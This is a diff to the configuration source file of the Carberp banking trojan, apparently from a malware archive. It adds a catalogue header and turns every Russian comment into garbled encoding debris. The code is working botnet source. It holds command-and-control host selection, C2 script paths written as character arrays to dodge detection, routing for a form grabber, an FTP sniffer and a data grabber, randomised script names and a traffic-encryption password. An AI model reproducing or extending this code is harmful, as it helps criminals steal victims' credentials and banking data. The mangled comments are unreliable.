@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 
 #include "Config.h"
@@ -34,11 +45,11 @@ char BOT_PREFIX[21] = "BOT_UID\0";
 #endif
 
 
-// Все хосты с которыми работает бот
+// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
 //PCHAR BotHosts[] = {MainHost_1, MainHost_2, MainHost_3};
 
 
-// Адреса скриптов
+// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 #ifndef CryptHTTPH
 	const static char PathTask[]        = {'/','s','e','t','/','t','a','s','k','.','h','t','m','l',0};
 	const static char PathFirstInfo[]   = {'/','s','e','t','/','f','i','r','s','t','.','h','t','m','l',0};
@@ -52,10 +63,10 @@ const static char PathPlugins[]     = {'/','s','e','t','/','p','l','u','g','s','
 
 
 
-// Расширения доступные для папки SET
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ SET
 const static PCHAR SETFolderExts[] = {".phtml", ".php3", ".phtm", ".inc", ".7z"};
 
-// Расширения доступные для папки GET
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ GET
 const static PCHAR GETFolderExts[] = {".cgi", ".pl", ".doc", ".rtf", ".tpl", ".rar"};
 
 
@@ -87,7 +98,7 @@ char *GetPrefix()
 
 PCHAR GetMainHostByID(BYTE ID)
 {
-	// Получчить имя хоста по номеру
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	switch (ID)
 	{
 	case 0: return MainHost_1;
@@ -100,14 +111,14 @@ PCHAR GetMainHostByID(BYTE ID)
 
 PCHAR GetScriptByID(BYTE ID, bool &Created)
 {
-	// Получить адрес скрипта по его номеру
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	switch (ID)
 	{
 	case ScriptConfig:
 		Created = true;
 		return STR::New(2, (PCHAR)PathConfig, GetPrefix());
 
-	// Скрипт Форм грабера
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	case ScriptFormGrabber:
 		#ifdef CryptHTTPH
 			Created = true;
@@ -116,7 +127,7 @@ PCHAR GetScriptByID(BYTE ID, bool &Created)
 			return (PCHAR)PathGrabber;
 		#endif
 
-	// Скрипт получания задач
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	case ScriptTask:
 		#ifdef CryptHTTPH
 			Created = true;
@@ -125,7 +136,7 @@ PCHAR GetScriptByID(BYTE ID, bool &Created)
 			return (PCHAR)PathTask;
 		#endif
 
-	// Скрипт отправки
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	case ScriptFirstInfo:
 		#ifdef CryptHTTPH
 			Created = true;
@@ -136,7 +147,7 @@ PCHAR GetScriptByID(BYTE ID, bool &Created)
 
 	case ScriptPlugins:     return (PCHAR)PathPlugins;
 
-	// Скрипт FTP снифера
+	// пїЅпїЅпїЅпїЅпїЅпїЅ FTP пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	case ScriptFTPSniffer:
 		#ifdef CryptHTTPH
 			Created = true;
@@ -146,7 +157,7 @@ PCHAR GetScriptByID(BYTE ID, bool &Created)
 		#endif
 
 
-	// Скрипт грабера
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	case ScriptGrabber:
 		#ifdef CryptHTTPH
 			Created = true;
@@ -174,7 +185,7 @@ int GetDelay()
 }
 
 #ifdef DEBUGCONFIG
-	// В отладочном режиме предоставляем возможность установить отладочный хост
+	// пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	
 	void SetDebugHost(PCHAR Host)
 	{
@@ -192,7 +203,7 @@ char *GetCurrentHost()
 	#endif
 
 
-	// ЭТОТ БРЕД ПЕРЕПМСАТЬ!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+	// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 	char *Ret = NULL;
 
 	char CurrentHost[ 128 ];
@@ -227,7 +238,7 @@ char *GetCurrentHost()
 
 PCHAR GetCurrentHost2()
 {
-	// Функция возвращает первый рабочий адрес из массива используемых хостов
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	#ifdef DEBUGCONFIG
 		return STR::New(DebugHost);
 	#endif
@@ -253,7 +264,7 @@ PCHAR GetCurrentHost2()
 
 PCHAR GetBotScriptURL(BYTE Script)
 {
-	// Функция возвращает полный адрес скрипта
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
     bool PathCreated = false;
 	PCHAR Path = GetScriptByID(Script, PathCreated);
 
@@ -277,7 +288,7 @@ PCHAR GetBotScriptURL(BYTE Script)
 
 
 
-// Функция возвращает пароль для криптования принимаемых/отправляемых данных
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ/пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 #ifdef CryptHTTPH
 	PCHAR GetMainPassword()
 	{
@@ -285,7 +296,7 @@ PCHAR GetBotScriptURL(BYTE Script)
 			return STR::New(DebugPassword);
 		#endif
 
-		// Проверяем задан ли в боте пароль
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		if (CalcHash(MainPassword) == MainPasswordNameHash)
 			return NULL;
 
@@ -298,7 +309,7 @@ PCHAR GetBotScriptURL(BYTE Script)
 
 PCHAR GenerateRandomScript(DWORD Min1, DWORD Max1, DWORD Min2, DWORD Max2, DWORD ExtsCount, PCHAR *Exts)
 {
-	// Функция генерирует случайное имя скрипта
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	DWORD Sz = 0;
 	if (Random::Generate(0, 1000) < 500)
 		Sz = Random::Generate(Min1, Max1);
@@ -307,7 +318,7 @@ PCHAR GenerateRandomScript(DWORD Min1, DWORD Max1, DWORD Min2, DWORD Max2, DWORD
 
 	PCHAR Name = Random::RandomString(Sz, 'a', 'z');
 
-	// Добавляем расширение скрипта
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 	DWORD ExtPos = Random::Generate(1, ExtsCount);
 	for (DWORD i = 1; i < ExtPos; i++, Exts++);
